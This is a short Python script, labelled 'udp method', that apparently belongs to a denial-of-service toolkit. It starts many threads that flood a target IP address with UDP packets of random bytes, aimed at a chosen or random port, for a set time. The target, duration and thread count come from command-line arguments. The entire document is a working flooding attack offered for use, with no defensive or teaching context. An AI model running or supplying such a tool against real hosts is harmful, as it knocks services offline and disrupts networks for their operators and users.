
# udp method

import socket, time, random, threading
from sys import argv
from threading import Thread

def udp(ip, port, floodtime, size):
	while time.time() < floodtime:
		with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
			dport = random.randint(1, 65535) if port == 0 else port
			data = random._urandom(size)
			sock.sendto(data, (ip, dport))


for _ in range(int(argv[5])):
        Thread(target=udp, args=(str(argv[1]), int(argv[2]), time.time() + int(argv[3]), int(4))).start()
